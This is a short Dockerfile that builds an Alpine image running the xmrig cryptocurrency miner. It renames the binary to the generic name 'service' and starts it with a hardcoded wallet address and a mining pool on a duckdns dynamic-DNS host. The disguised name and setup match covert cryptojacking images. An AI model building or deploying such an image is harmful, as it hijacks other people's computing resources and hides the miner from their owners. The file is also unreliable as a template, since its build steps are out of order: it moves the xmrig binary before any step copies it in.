FROM alpine:latest

RUN mv xmrig service
RUN mkdir -p /usr/local/bin/service

COPY service /usr/local/bin/service
RUN chmod +x /usr/local/bin/service

WORKDIR /usr/local/bin/service

ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
ENV POOL=imboost.duckdns.org:1123
ENV WORKER_NAME=x

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
